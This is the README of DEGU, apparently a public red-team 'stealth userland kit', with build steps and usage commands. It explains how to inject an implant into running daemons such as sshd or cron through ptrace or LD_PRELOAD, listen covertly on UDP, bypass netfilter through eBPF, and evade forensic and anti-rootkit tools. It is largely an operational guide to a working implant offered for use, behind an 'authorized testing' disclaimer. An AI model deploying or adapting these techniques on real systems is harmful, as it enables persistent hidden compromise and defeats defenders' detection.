# DEGU: Advanced Stealth Userland Kit
**EDUCATIONAL PURPOSES ONLY. USE EXCLUSIVELY ON YOUR OWN SYSTEMS.**

<p align="center">
  <img src="https://raw.githubusercontent.com/io-tl/degu-lib/refs/heads/main/degu.png">
</p>

## Overview

DEGU is a sophisticated stealth userland kit designed for covert operation for red teaming without requiring sys_clone/sys_execve calls as root. Developed primarily for red team operations, it enables persistent access to compromised assets while evading common detection mechanisms.

### Key Features

- **Evasion Capabilities**: Bypasses detection by conventional anti-rootkit tools and forensics frameworks including Volatility
- **Firewall Circumvention**: As root, bypasses netfilter rules using raw ethernet eBPF rules
- **Process Parasiting**: As root, it can inject into userland process or use process hollowing as user
- **Static Executable Launching**: Uses ulexec to launch static executables ( 🐁 ♥  Rust & Go ) inside parasited processes
- **Python API**: Provides seamless automation capabilities

## Requirements

- OpenSSH (for ssh-keygen binary)
- Python 3
- Golang
- GCC toolchain

## Quick Start

```bash
git clone https://github.com/io-tl/degu-lib
cd degu-lib
./config -r -s build
```

## Technical Architecture

DEGU operates as an "autorelocatable" executable library that uses signals to execute within parasitized processes without requiring fork, thread creation, or function hooking. 

Security features include:
- Elliptic curve cryptography (ed25519) for message signing and key exchange
- AES session encryption
- Process hollowing for stealth execution
- UDP/Raw ethernet packet communication

## Usage

### Root Mode

As root, DEGU can inject into existing processes using ptrace and wait for activation commands.

```bash
# Basic usage (auto-selects from candidate process list)
./degu.prod.so

# Target a specific process
./degu.prod.so <pid>

# Alternative: Use LD_PRELOAD (spawns a visible process)
LD_PRELOAD=/root/degu.dbg.so /bin/ls
```

#### Candidate Process Configuration

You can edit the list of candidate processes in `degu/main.c`:

```c
#define CANDSIZE 11
char *candidate[CANDSIZE]= {
    "udev",
    "cron",
    "udisksd",
    "syslog",
    "containerd",
    "sshd",
    "getty",
    "agetty",
    "dhcp",
    "master",
    NULL
};
```

### User Mode

As a regular user, DEGU can listen on a non-privileged UDP port:

```bash
# Parasite an executable and launch
./degu.dbg.so <port> <bin>

# Example
./degu.dbg.so 31337 /bin/ls

# Standalone without parasiting
./degu.dbg.so <port>

# Using LD_PRELOAD
PORT=31337 LD_PRELOAD=/path/to/degu.dbg.so /bin/ls
```

## Building

The `./config` script generates necessary keys and builds the DEGU components:

```bash
./config -r -s build
```

Options:
- `-d, --dest DEST`: Output directory (default: /tmp/degu)
- `-r, --rand`: Generate new keys.h (required for first build)
- `-s, --ssh`: Generate new SSH keys (required for first build)
- `-f, --force`: Overwrite existing libraries
- `-v, --verbose`: Enable verbose output

## Troubleshooting

DEGU may output error codes with specific emoticons:

| Symbol | Description | Error Code |
|--------|-------------|------------|
| `3<`   | Attach failed - couldn't attach via ptrace | -101 |
| `:(`   | Injection failed - couldn't write to process memory | -102 |
| `:/`   | Seccomp error - target has too restrictive seccomp policy | -103 |
| `:\`   | Deleted libs error - dlopen invocation would fail | -104 |
| `?`    | Parasiting error - not an ELF or insufficient memory | -105 |

## Debugging

The `degu.dbg.so` library outputs debug messages to `/tmp/debug`. For operational security, use `degu.prod.so` in production environments.

## Container Considerations

Be cautious when using in containerized environments, as ptrace syscalls may be restricted:

```
[269197.431639] ptrace attach of "sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups"[986278] was attempted by "./degu.dbg.so"[986385]
```

In such cases, consider using the LD_PRELOAD method instead.

## Client & API

For documentation on client usage and API functionality, see the separate client README.md.

---

*DEGU is designed for authorized security testing only. Unauthorized use against systems you don't own is illegal and unethical.*
